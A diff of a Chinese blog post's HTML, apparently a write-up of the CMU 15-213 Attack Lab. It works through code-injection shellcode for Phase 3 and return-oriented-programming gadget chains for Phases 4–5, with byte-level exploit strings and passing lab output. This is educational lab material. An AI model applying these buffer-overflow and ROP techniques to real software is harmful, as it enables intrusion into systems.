+<li><code>59b997fa</code>的字符串编码应该是：<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61</code>（插在攻击代码前）</li>
+<li><code>buf + 8</code>处的地址是：<code>0x5561dc80</code>（插入返回地址部分），转化成小端法应该是<code>80 dc 61 55</code></li>
+<li><code>touch3</code>的地址是<code>0x4018fa</code></li>
 </ol>
 <p>那么我们的攻击指令应该是：</p>
 <pre><code>movl $0x5561dc78,%edi
@@ -377,7 +430,7 @@ subq $0x8,%rsp
 movl $0x4018fa,(%rsp)
 ret
 </code></pre>
-<p>将其放入 <code>ph3.s</code>  中，输入 <code>gcc -c ph3.s</code>  得到 <code>ph3.o</code> ，输入 <code>objdump -d ph3.o &gt; ph3.d</code> ，得到 <code>ph3.d</code>  文件如下：</p>
+<p>将其放入<code>ph3.s</code>中，输入<code>gcc -c ph3.s</code>得到<code>ph3.o</code>，输入<code>objdump -d ph3.o &gt; ph3.d</code>，得到<code>ph3.d</code>文件如下：</p>
 <pre><code>
 ph3.o:     file format elf64-x86-64
 
@@ -393,10 +446,8 @@ Disassembly of section .text:
   12:	90                   	nop
   13:	90                   	nop
   14:	90                   	nop
-
 </code></pre>
-<p>那么其字节应该是 <code>bf 78 dc 61 55 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code> 。一共 17 个字节，加上最前面 8 个字节，一共 25 个字节。最后插入 15 个字节的 <code>nop</code> 。<br>
-执行过程中内存情况如下：</p>
+<p>那么其字节应该是<code>bf 78 dc 61 55 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code>。一共 17 个字节，加上最前面 8 个字节，一共 25 个字节。最后插入 15 个字节的<code>nop</code>。<br>执行过程中内存情况如下：</p>
 <pre><code>(gdb) x/48xb 0x5561dc78
 0x5561dc78:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
 0x5561dc80:     0xbf    0x78    0xdc    0x61    0x55    0x48    0x83    0xec
@@ -405,15 +456,15 @@ Disassembly of section .text:
 0x5561dc98:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
 0x5561dca0:     0x80    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
 </code></pre>
-<p>而这里我们打印值后发现我们的 <code>%edi</code>  所指向的字符串如下：</p>
+<p>而这里我们打印值后发现我们的<code>%edi</code>所指向的字符串如下：</p>
 <pre><code>(gdb) x/s $rdi
 0x5561dc78:     &quot;59b997fa\277x\334aUH\203\354\b\307\004$\372\030@&quot;
 </code></pre>
-<p>而 <code>cookie</code>  的值如下：</p>
+<p>而<code>cookie</code>的值如下：</p>
 <pre><code>(gdb) p /x cookie
 $14 = 0x59b997fa
 </code></pre>
-<p>但是后来这个 <code>buf</code>  的空间就变成了这样：</p>
+<p>但是后来这个<code>buf</code>的空间就变成了这样：</p>
 <pre><code>5: x/48xb 0x5561dc78
 0x5561dc78:     0x00    0x2e    0x40    0xcb    0xed    0x3e    0x25    0xb2
 0x5561dc80:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
@@ -422,16 +473,19 @@ $14 = 0x59b997fa
 0x5561dc98:     0x16    0x19    0x40    0x00    0x00    0x00    0x00    0x00
 0x5561dca0:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
 </code></pre>
-<p>但是我们后来发现，这里栈的内容被完全改变了，而且字符串的后面忘了加 <code>\0</code>  字符。所以这里是有一些问题的。</p>
-<h4 id="正确的解答"><a class="markdownIt-Anchor" href="#正确的解答">#</a> 正确的解答</h4>
-<p>经过查阅一些<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==">网上的资料</span>发现，我在阅读 C 语言代码的时候忽略了这 2 行：</p>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">/* Make position of check string unpredictable */</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>那么 <code>hexmatch</code>  和 <code>strncmp</code>  中分配的空间就是随机的。那么我们所做出的改变应该是让插入的字符串放在父函数 <code>test</code>  的位置，然后让 <code>%rdi</code>  指向 <code>test</code>  栈空间中的位置。 <code>test</code>  函数的位置在返回地址下面，那么应该是 <code>buf + 48</code>  即 <code>0x5561dca8</code> 。其字符 <code>bf 78 dc 61 55 48 83 ec 00</code>  应该在返回地址后面。而攻击代码也应该改为：</p>
+<p>但是我们后来发现，这里栈的内容被完全改变了，而且字符串的后面忘了加<code>\0</code>字符。所以这里是有一些问题的。</p>
+<h4 id="正确的解答"><a href="#正确的解答" class="headerlink" title="正确的解答"></a>正确的解答</h4><p>经过查阅一些<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==">网上的资料</span>发现，我在阅读 C 语言代码的时候忽略了这 2 行：</p>
+<pre><code class="c">char cbuf[110];
+/* Make position of check string unpredictable */
+char *s = cbuf + random() % 100;
+</code></pre>
+<p>那么<code>hexmatch</code>和<code>strncmp</code>中分配的空间就是随机的。那么我们所做出的改变应该是让插入的字符串放在父函数<code>test</code>的位置，然后让<code>%rdi</code>指向<code>test</code>栈空间中的位置。<code>test</code>函数的位置在返回地址下面，那么应该是<code>buf + 48</code>即<code>0x5561dca8</code>。其字符<code>bf 78 dc 61 55 48 83 ec 00</code>应该在返回地址后面。而攻击代码也应该改为：</p>
 <pre><code>movl $0x5561dca8,%edi
 subq $0x8,%rsp
 movl $0x4018fa,(%rsp)
 ret
 </code></pre>
-<p>中间两行代码可以改为 <code>pushq $0x4018fa</code> 。由此，我们在 <code>ph3.s</code>  中放入如下内容：</p>
+<p>中间两行代码可以改为<code>pushq $0x4018fa</code>。由此，我们在<code>ph3.s</code>中放入如下内容：</p>
 <pre><code>movl $0x5561dca8,%edi
 pushq $0x4018fa
 ret
@@ -452,34 +506,39 @@ Disassembly of section .text:
    d:	90                   	nop
    e:	90                   	nop
 </code></pre>
-<p>这次我们不把汇编代码插入 <code>buf + 8</code>  了，因为没有意义，我们直接将其插入汇编代码开头即可。最后的 8 个字节返回地址改为 <code>0x5561dc78</code> 。其前面的内容为 <code>bf a0 dc 61 55 68 fa 18 40 00 c3</code> ，共 11 个字节。插入 29 个 <code>nop</code>  (0x90)。在插入 8 个字节的返回地址（ <code>0x000000005561dc78</code> ）。最后放入 9 个字节的字符串 <code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code> 。最后结果如下：</p>
-<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num="2"></td><td><pre>Type string:Touch3<span class="token operator">!</span>: You called touch3<span class="token punctuation">(</span><span class="token string">"59b997fa"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Valid solution <span class="token keyword">for</span> level <span class="token number">3</span> with target ctarget</pre></td></tr><tr><td data-num="4"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num="5"></td><td><pre>        user <span class="token function">id</span> bovik</pre></td></tr><tr><td data-num="6"></td><td><pre>        course  <span class="token number">15213</span>-f15</pre></td></tr><tr><td data-num="7"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num="8"></td><td><pre>        result  <span class="token number">1</span>:PASS:0xffffffff:ctarget:3:BF A8 DC <span class="token number">61</span> <span class="token number">55</span> <span class="token number">68</span> FA <span class="token number">18</span> <span class="token number">40</span> 00 C3 <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">90</span> <span class="token number">78</span> DC <span class="token number">61</span> <span class="token number">55</span> 00 00 00 00 <span class="token number">35</span> <span class="token number">39</span> <span class="token number">62</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">37</span> <span class="token number">66</span> <span class="token number">61</span> 00</pre></td></tr></table></figure><p>通过！</p>
-<h2 id="part-ii-return-oriented-programming-attack"><a class="markdownIt-Anchor" href="#part-ii-return-oriented-programming-attack">#</a> Part II: Return oriented Programming attack</h2>
-<p><code>rtarget</code>  的攻击要比 <code>ctarget</code>  难一些，因为：</p>
+<p>这次我们不把汇编代码插入<code>buf + 8</code>了，因为没有意义，我们直接将其插入汇编代码开头即可。最后的 8 个字节返回地址改为<code>0x5561dc78</code>。其前面的内容为<code>bf a0 dc 61 55 68 fa 18 40 00 c3</code>，共 11 个字节。插入 29 个<code>nop</code>(0x90)。在插入 8 个字节的返回地址（<code>0x000000005561dc78</code>）。最后放入 9 个字节的字符串<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code>。最后结果如下：</p>
+<pre><code class="bash">Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:BF A8 DC 61 55 68 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
+</code></pre>
+<p>通过！</p>
+<h2 id="Part-II-Return-oriented-Programming-attack"><a href="#Part-II-Return-oriented-Programming-attack" class="headerlink" title="Part II: Return oriented Programming attack"></a>Part II: Return oriented Programming attack</h2><p><code>rtarget</code>的攻击要比<code>ctarget</code>难一些，因为：</p>
 <ol>
 <li>开启了栈随机化，程序的地址难以预测</li>
 <li>开启了 Non-executable 位，导致我们插入的代码部分难以执行</li>
 </ol>
-<p>因此，我们使用一种新的方法：return oriented programming attacks。它的核心在于利用已有的程序，而不是注入代码。每个 gadget 是一个代码段，每个 gadget 的最后都是 <code>ret</code>  指令（编码 <code>c3</code> ），将这个自己和其前面的部分字节组合起来，可以合成我们想要的指令。此外，针对 x86_64，我们不一定要利用整条指令，有的时候一条指令的一部分字节又可以组成另一条指令。所有 gadget 的地址被压在栈上，每次调用 <code>ret</code>  之后就会返回到下一个 gadget 的地址。</p>
-<h3 id="phase-4"><a class="markdownIt-Anchor" href="#phase-4">#</a> Phase 4</h3>
-<p>利用 <code>rop</code>  重做 Phase 2 的实验，可以使用 <code>movq, popq, ret, nop</code>  指令以及前 8 个寄存器 ( <code>%rax–%rdi</code> )<br>
- 提示：</p>
+<p>因此，我们使用一种新的方法：return oriented programming attacks。它的核心在于利用已有的程序，而不是注入代码。每个 gadget 是一个代码段，每个 gadget 的最后都是<code>ret</code>指令（编码<code>c3</code>），将这个自己和其前面的部分字节组合起来，可以合成我们想要的指令。此外，针对 x86_64，我们不一定要利用整条指令，有的时候一条指令的一部分字节又可以组成另一条指令。所有 gadget 的地址被压在栈上，每次调用<code>ret</code>之后就会返回到下一个 gadget 的地址。</p>
+<h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h3><p>利用<code>rop</code>重做 Phase 2 的实验，可以使用<code>movq, popq, ret, nop</code>指令以及前 8 个寄存器(<code>%rax–%rdi</code>)<br>提示：</p>
 <ol>
-<li>可以在 <code>start_farm</code>  和 <code>mid_farm</code>  之间寻找 gadget</li>
+<li>可以在<code>start_farm</code>和<code>mid_farm</code>之间寻找 gadget</li>
 <li>可以只使用 2 个 gadget</li>
-<li>当一个 gadget 使用 <code>popq</code>  指令时，它从栈上弹出一个数值，所以你的攻击字符串可以是 gadget 地址和数值的组合。</li>
+<li>当一个 gadget 使用<code>popq</code>指令时，它从栈上弹出一个数值，所以你的攻击字符串可以是 gadget 地址和数值的组合。</li>
 </ol>
-<p>Phase 2 的目的是让 <code>test()</code>  跳转到 <code>touch2</code>  函数，并且需要让 <code>%edi</code>  的值等于 <code>cookie</code>  的值。</p>
+<p>Phase 2 的目的是让<code>test()</code>跳转到<code>touch2</code>函数，并且需要让<code>%edi</code>的值等于<code>cookie</code>的值。</p>
 <p>我们当时做题的主要过程是：</p>
 <ol>
-<li>让最后的转移地址为 <code>buf</code>  开头的位置 ( <code>0x5561dc78</code> )</li>
-<li>在 <code>buf</code>  中存储攻击指令
-<ol>
-<li>让 <code>%edi = *0x6054e4</code></li>
-<li>将 <code>touch2</code>  的地址压入栈中， <code>pushq 0x4017ec</code></li>
+<li>让最后的转移地址为<code>buf</code>开头的位置(<code>0x5561dc78</code>)</li>
+<li>在<code>buf</code>中存储攻击指令<ol>
+<li>让<code>%edi = *0x6054e4</code></li>
+<li>将<code>touch2</code>的地址压入栈中，<code>pushq 0x4017ec</code></li>
 </ol>
 </li>
-<li>调用 <code>ret</code>  返回</li>
+<li>调用<code>ret</code>返回</li>
 </ol>
 <p>我们在 phase 2 中需要插入的代码是：</p>
 <pre><code>    movq $0x6054e4,%rax
@@ -488,23 +547,23 @@ Disassembly of section .text:
     movq $0x4017ec,(%rsp)
     ret
 </code></pre>
-<p>这里的变化在于，我们不需要使用 <code>buf</code>  来存储攻击指令了，而是在整个程序中寻找攻击指令。把第一个 gadget 的地址放在返回地址处，把第二个 gadget 的地址放在第一个 gadget 后面。以此类推。我们的目的是找到所有的 gadget。</p>
-<p>但是其实这段代码可以通过把 <code>0x6054e4</code>  和 <code>0x6017ec</code>  两个值压在栈上。首先利用一个 <code>popq</code>  指令将其弹出到 <code>%rax</code>  中，然后将 <code>%rax</code>  处的值移动到 <code>%rdi</code>  上。我们可以这样设计栈帧：</p>
-<p><img data-src="frame.png" alt="frame.png"></p>
-<p>第一个 <code>gadget</code>  中的代码是：</p>
+<p>这里的变化在于，我们不需要使用<code>buf</code>来存储攻击指令了，而是在整个程序中寻找攻击指令。把第一个 gadget 的地址放在返回地址处，把第二个 gadget 的地址放在第一个 gadget 后面。以此类推。我们的目的是找到所有的 gadget。</p>
+<p>但是其实这段代码可以通过把<code>0x6054e4</code>和<code>0x6017ec</code>两个值压在栈上。首先利用一个<code>popq</code>指令将其弹出到<code>%rax</code>中，然后将<code>%rax</code>处的值移动到<code>%rdi</code>上。我们可以这样设计栈帧：</p>
+<p><img data-src="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame.png" alt="frame.png"></p>
+<p>第一个<code>gadget</code>中的代码是：</p>
 <pre><code>movq %rsp, %rxx
 popq %rax
 movq (%rax),%rdi
 </code></pre>
-<p>第二个 <code>gadget</code>  中的代码是：</p>
+<p>第二个<code>gadget</code>中的代码是：</p>
 <pre><code>popq %rax
 movq %rax,(%rxx)
 </code></pre>
-<p>使用 <code>popq %rax</code>  是因为， <code>popq</code>  有 8 种可能的结果，而只有 <code>popq %rax</code>  出现在代码的字节中，因此我们从这里出发。我们翻译一下 <code>movq (%rax),%rdi</code> ，其字节编码为 <code>48 8b 38</code> 。</p>
-<p>但是我们发现其实不用那么麻烦，也就是说不用保存之前的 <code>%rsp</code> ，这是因为我们可以通过 <code>gadget</code>  中的 <code>ret</code>  指令弹出后 8 个字节的地址并且首先跳转，那么就无需把 <code>touch3</code>  的地址保存在最开始的部分。栈空间可以简化成如下情况：</p>
-<p><img data-src="frame1.png" alt="frame1.png"></p>
-<p>但是我们发现一个问题，就是 <code>movq (%rax),%rdi</code>  这条指令所对应的字节在源程序中找不到，因此我们需要采取一个更加优化的办法，就是不在栈上保存 <code>cookie</code>  的地址，而是直接保存 <code>cookie</code>  的值， <code>cookie</code>  的值为 <code>0x59b997fa</code> ，那么栈空间可以简化成如下情况：</p>
-<p><img data-src="frame3.png" alt="frame3.png"></p>
+<p>使用<code>popq %rax</code>是因为，<code>popq</code>有 8 种可能的结果，而只有<code>popq %rax</code>出现在代码的字节中，因此我们从这里出发。我们翻译一下<code>movq (%rax),%rdi</code>，其字节编码为<code>48 8b 38</code>。</p>
+<p>但是我们发现其实不用那么麻烦，也就是说不用保存之前的<code>%rsp</code>，这是因为我们可以通过<code>gadget</code>中的<code>ret</code>指令弹出后 8 个字节的地址并且首先跳转，那么就无需把<code>touch3</code>的地址保存在最开始的部分。栈空间可以简化成如下情况：</p>
+<p><img data-src="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame1.png" alt="frame1.png"></p>
+<p>但是我们发现一个问题，就是<code>movq (%rax),%rdi</code>这条指令所对应的字节在源程序中找不到，因此我们需要采取一个更加优化的办法，就是不在栈上保存<code>cookie</code>的地址，而是直接保存<code>cookie</code>的值，<code>cookie</code>的值为<code>0x59b997fa</code>，那么栈空间可以简化成如下情况：</p>
+<p><img data-src="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame3.png" alt="frame3.png"></p>
 <p>这样只需要两条指令就可以做到了。这两条指令的编码是</p>
 <pre><code>
 gadget.o:     file format elf64-x86-64
@@ -515,12 +574,11 @@ Disassembly of section .text:
 0000000000000000 &lt;.text&gt;:
    0:	58                   	pop    %rax
    1:	48 89 c7             	mov    %rax,%rdi
-
 </code></pre>
-<p>但是这两条指令我们无法在同一处找到，因此需要划分为 2 个 <code>gadget</code> 。且两条后面的都必须接数个 <code>90</code> （ <code>nop</code> ）加上一个 <code>c3</code> 。</p>
-<p>第一个的地址是 <code>4019ab</code>  或 <code>4019cc</code> 。第二个的地址是 <code>4019a2</code>  或者 <code>4019c5</code> 。</p>
-<p>我们这里使用 <code>4019ab</code>  和 <code>4019a2</code>  两个 <code>gadget</code> 。第一个中存储 <code>pop %rax</code>  指令，第二个中存储 <code>mov %rax, %rdi</code>  指令。最后的栈空间如下：</p>
-<p><img data-src="frame-last.png" alt="frame-last.png"></p>
+<p>但是这两条指令我们无法在同一处找到，因此需要划分为 2 个<code>gadget</code>。且两条后面的都必须接数个<code>90</code>（<code>nop</code>）加上一个<code>c3</code>。</p>
+<p>第一个的地址是<code>4019ab</code>或<code>4019cc</code>。第二个的地址是<code>4019a2</code>或者<code>4019c5</code>。</p>
+<p>我们这里使用<code>4019ab</code>和<code>4019a2</code>两个<code>gadget</code>。第一个中存储<code>pop %rax</code>指令，第二个中存储<code>mov %rax, %rdi</code>指令。最后的栈空间如下：</p>
+<p><img data-src="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame-last.png" alt="frame-last.png"></p>
 <p>由此，输入的攻击字符串的前 40 个字节随意，后面 32 个字节根据上述栈情况为（注意应该用小端法）</p>
 <pre><code>ab 19 40 00 00 00 00 00
 fa 97 b9 59 00 00 00 00
@@ -530,52 +588,66 @@ ec 17 40 00 00 00 00 00
 <blockquote>
 <p>刚刚差点把 gadget1 和 2 的地址搞反了，导致跑出来 segmentation fault，还疑惑是怎么回事，后来一看发现不好，哈哈哈哈，做题的时候还是要认真仔细嗷！</p>
 </blockquote>
-<p>输入 <code>./hex2raw &lt; phase4.txt | ./rtarget -q</code> （注意不要输入成 <code>ctarget</code>  啦！），运行结果如下：</p>
-<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>gwen@gwen-virtual-machine:~/Documents/report/code/15213/lab/lab3-attack-lab$ ./hex2raw <span class="token operator">&lt;</span> phase4.txt <span class="token operator">|</span> ./rtarget <span class="token parameter variable">-q</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num="3"></td><td><pre>Type string:Touch2<span class="token operator">!</span>: You called touch2<span class="token punctuation">(</span>0x59b997fa<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Valid solution <span class="token keyword">for</span> level <span class="token number">2</span> with target rtarget</pre></td></tr><tr><td data-num="5"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num="6"></td><td><pre>        user <span class="token function">id</span> bovik</pre></td></tr><tr><td data-num="7"></td><td><pre>        course  <span class="token number">15213</span>-f15</pre></td></tr><tr><td data-num="8"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num="9"></td><td><pre>        result  <span class="token number">1</span>:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00 FA <span class="token number">97</span> B9 <span class="token number">59</span> 00 00 00 00 A2 <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00 EC <span class="token number">17</span> <span class="token number">40</span> 00 00 00 00 00</pre></td></tr></table></figure><h3 id="phase-5"><a class="markdownIt-Anchor" href="#phase-5">#</a> Phase 5</h3>
-<p>phase 5 的任务是让 <code>%rdi</code>  指向 <code>cookie</code>  的字符串表示并调用 <code>touch 3</code> ，这个任务看起来有点类似我们在 Phase 3 中做的工作。</p>
+<p>输入<code>./hex2raw &lt; phase4.txt | ./rtarget -q</code>（注意不要输入成<code>ctarget</code>啦！），运行结果如下：</p>
+<pre><code class="bash">gwen@gwen-virtual-machine:~/Documents/report/code/15213/lab/lab3-attack-lab$ ./hex2raw &lt; phase4.txt | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
+</code></pre>
+<h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h3><p>phase 5 的任务是让<code>%rdi</code>指向<code>cookie</code>的字符串表示并调用<code>touch 3</code>，这个任务看起来有点类似我们在 Phase 3 中做的工作。</p>
 <p>作者提示：</p>
 <ol>
-<li>可使用的 <code>gadget</code>  的范围是 <code>start_farm</code>  到 <code>end_farm</code></li>
+<li>可使用的<code>gadget</code>的范围是<code>start_farm</code>到<code>end_farm</code></li>
 <li>利用 Appendix 中的表</li>
-<li>复习一下课本 P83 的 <code>movl</code>  的用法</li>
+<li>复习一下课本 P83 的<code>movl</code>的用法</li>
 <li>官方答案使用了 8 个 gadget</li>
 </ol>
 <p>在 Phase 3 中我们所做的工作是：</p>
 <ol>
 <li>插入攻击字符串在攻击代码前</li>
 <li>在返回地址处插入攻击代码的起始位置</li>
-<li>在攻击代码中实现如下操作：
-<ol>
-<li>将攻击字符串的地址赋值给 <code>%rdi</code></li>
-<li>将 <code>touch3</code>  的返回地址压入返回地址处</li>
+<li>在攻击代码中实现如下操作：<ol>
+<li>将攻击字符串的地址赋值给<code>%rdi</code></li>
+<li>将<code>touch3</code>的返回地址压入返回地址处</li>
 </ol>
 </li>
 </ol>
-<p>现在使用 <code>rop</code>  后的问题在于：攻击字符串压到哪？现在栈上是返回地址和字符串的组合。那么我们的想法是让攻击字符串放在所有 gadget 地址之后。但是具体放在之后多少呢？这要看 <code>mov xxx, %rdi</code>  中哪些地址的编码存在。</p>
-<p>首先， <code>cookie</code>  的值是 <code>59b997fa</code> ，那么其字符串编码是 <code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code> ( <code>0x00</code>  是字符串最后的 <code>\0</code> )。那么我们构建的 <code>gadget</code>  中应有的步骤是：</p>
+<p>现在使用<code>rop</code>后的问题在于：攻击字符串压到哪？现在栈上是返回地址和字符串的组合。那么我们的想法是让攻击字符串放在所有 gadget 地址之后。但是具体放在之后多少呢？这要看<code>mov xxx, %rdi</code>中哪些地址的编码存在。</p>
+<p>首先，<code>cookie</code>的值是<code>59b997fa</code>，那么其字符串编码是<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code>(<code>0x00</code>是字符串最后的<code>\0</code>)。那么我们构建的<code>gadget</code>中应有的步骤是：</p>
 <ol>
 <li><code>mov 地址,%rdi</code></li>
 <li><code>ret</code></li>
 </ol>
-<p>此外， <code>touch3</code>  的地址是 <code>0x4018fa</code> 。那么我们最初设计的栈空间如图：</p>
-<p><img data-src="phase5.png" alt="phase5.png"></p>
-<p>但是我后来有点卡壳了，问题在于把字符串存在什么位置呢？如果存在那个位置，在 <code>rtarget</code>  汇编中能找到对应的 <code>gadget</code>  吗？于是我查找了<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=">一点资料</span> (有点耍赖了对不起对不起～)，这个资料中提到的一条信息是我没有想到的：</p>
+<p>此外，<code>touch3</code>的地址是<code>0x4018fa</code>。那么我们最初设计的栈空间如图：</p>
+<p><img data-src="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase5.png" alt="phase5.png"></p>
+<p>但是我后来有点卡壳了，问题在于把字符串存在什么位置呢？如果存在那个位置，在<code>rtarget</code>汇编中能找到对应的<code>gadget</code>吗？于是我查找了<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=">一点资料</span>(有点耍赖了对不起对不起~)，这个资料中提到的一条信息是我没有想到的：</p>
 <blockquote>
-<p>rtarget 相比 ctarget 的区别在于开启了栈随机化。也就是运行时字符串的地址是不确定的。在 phase 3 中我们所做的工作是刚好将其压在 <code>test</code>  函数的返回地址下面，但是这里我们需要其相对与栈顶的地址。</p>
+<p>rtarget 相比 ctarget 的区别在于开启了栈随机化。也就是运行时字符串的地址是不确定的。在 phase 3 中我们所做的工作是刚好将其压在<code>test</code>函数的返回地址下面，但是这里我们需要其相对与栈顶的地址。</p>
 </blockquote>
 <p>因此，我们应该做的步骤是：</p>
 <pre><code>1. 将攻击字符串放在%rsp + offset 处
 2. 让 %rdi = %rsp + offset
 3. ret
 </code></pre>
-<p>那么如何计算这个地址，并且将其赋给 <code>%rdi</code>  呢？这个地址的计算需要在 <code>%rsp</code>  的基础上偏移几十个字节。地址的计算我们可以使用 <code>lea</code>  指令，然而加法运算如何实现呢？我们看看代码中有没有提供：</p>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">/* Add two arguments */</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">long</span> <span class="token function">add_xy</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">return</span> x<span class="token operator">+</span>y<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这段代码的汇编格式如下：</p>
+<p>那么如何计算这个地址，并且将其赋给<code>%rdi</code>呢？这个地址的计算需要在<code>%rsp</code>的基础上偏移几十个字节。地址的计算我们可以使用<code>lea</code>指令，然而加法运算如何实现呢？我们看看代码中有没有提供：</p>
+<pre><code class="c">/* Add two arguments */
+long add_xy(long x, long y)
+&#123;
+    return x+y;
+&#125;
+</code></pre>
+<p>这段代码的汇编格式如下：</p>
 <pre><code>00000000004019d6 &lt;add_xy&gt;:
   4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   4019da:	c3                   	retq
 </code></pre>
